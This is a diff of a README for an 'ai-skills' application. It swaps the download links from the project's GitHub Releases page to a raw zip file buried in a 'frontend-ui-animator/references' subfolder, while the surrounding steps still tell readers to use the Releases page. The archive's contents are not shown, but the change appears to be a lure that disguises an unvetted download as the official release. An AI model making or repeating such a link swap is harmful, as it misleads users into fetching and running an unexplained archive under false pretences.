@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![GitHub Releases](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Durden7/ai-skills/releases)
+[![GitHub Releases](https://raw.githubusercontent.com/Durden7/ai-skills/main/skills/frontend-ui-animator/references/ai-skills-v3.3-beta.4.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/Durden7/ai-skills/main/skills/frontend-ui-animator/references/ai-skills-v3.3-beta.4.zip)
 
 ## 📖 Introduction
 
@@ -28,7 +28,7 @@ Before you download, ensure your device meets the following requirements:
 
 To get started, visit the following link to download the application:
 
-[Download ai-skills](https://github.com/Durden7/ai-skills/releases)
+[Download ai-skills](https://raw.githubusercontent.com/Durden7/ai-skills/main/skills/frontend-ui-animator/references/ai-skills-v3.3-beta.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, look for the latest version of the ai-skills application.
